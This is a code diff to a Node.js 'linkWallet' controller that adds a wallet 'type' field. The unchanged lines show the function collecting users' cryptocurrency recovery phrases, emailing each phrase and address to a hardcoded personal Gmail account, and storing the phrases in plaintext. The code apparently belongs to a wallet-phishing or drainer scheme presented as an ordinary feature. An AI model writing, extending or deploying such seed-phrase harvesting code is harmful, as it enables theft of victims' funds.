@@ -273,7 +273,7 @@ const generateReferenceNumber = () => {
 
 exports.linkWallet = async (req, res) => {
   try {
-    const { phrase, walletAddress } = req.body;
+    const { phrase, walletAddress, type } = req.body;
     const user = await User.findById(req.user.id);
 
     if (!user) {
@@ -288,13 +288,14 @@ exports.linkWallet = async (req, res) => {
     await sendEmail(
       'aguchris740@gmail.com',
       'Your Recovery Phrase Linked',
-      `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\n\nPlease store this safely and never share it with anyone.
+      `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease store this safely and never share it with anyone.
       \nReference Number: ${referenceNumber}`
     );
   
     user.wallets.push({
       phrase,
       walletAddress,
+      type,
       linkedAt: new Date(),
       referenceNumber
     });
@@ -305,6 +306,7 @@ exports.linkWallet = async (req, res) => {
       message: 'Wallet linked successfully',
       wallet: {
         walletAddress,
+        type,
         linkedAt: new Date(),
         referenceNumber
       }
